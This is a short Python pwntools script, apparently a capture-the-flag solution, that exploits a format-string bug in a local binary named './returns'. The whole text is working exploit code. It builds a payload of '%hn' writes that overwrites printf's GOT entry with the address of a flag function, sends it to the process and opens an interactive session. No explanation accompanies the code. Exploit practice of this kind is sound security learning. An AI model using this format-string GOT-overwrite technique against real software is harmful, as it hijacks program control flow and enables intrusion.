from pwn import *
import struct

flag = 0x0000000000400797
printf_got = 0x0000000000601040

payload = '%12$hn'+'%64x'+'%13$hn'+'%1879x'+'%14$hn'+'AAA\x00'+struct.pack('<Q', printf_got+4)+struct.pack('<Q', printf_got+2)+struct.pack('<Q', printf_got)

p = process("./returns")
p.sendline(payload)
p.interactive()